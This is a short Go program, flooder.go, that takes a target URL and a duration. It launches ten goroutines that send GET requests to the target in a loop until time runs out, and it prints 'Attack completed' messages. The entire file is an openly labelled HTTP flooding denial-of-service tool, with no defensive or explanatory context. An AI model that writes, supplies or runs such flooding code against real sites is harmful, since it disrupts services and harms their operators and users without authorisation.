package main

import (
	"fmt"
	"net/http"
	"os"
	"sync"
	"time"
)

func flood(url string, duration int, wg *sync.WaitGroup) {
	defer wg.Done()
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(endTime) {
		resp, err := http.Get(url)
		if err != nil {
			fmt.Println("Error:", err)
			continue
		}
		resp.Body.Close()
	}
	fmt.Println("Attack completed on", url)
}

func main() {
	if len(os.Args) != 3 {
		fmt.Println("Usage: go run flooder.go <url> <duration>")
		return
	}

	url := os.Args[1]
	duration := 0
	fmt.Sscanf(os.Args[2], "%d", &duration)

	var wg sync.WaitGroup
	for i := 0; i < 10; i++ { // Launch 10 goroutines for the attack
		wg.Add(1)
		go flood(url, duration, &wg)
	}

	wg.Wait()
	fmt.Println("All attacks completed.")
}
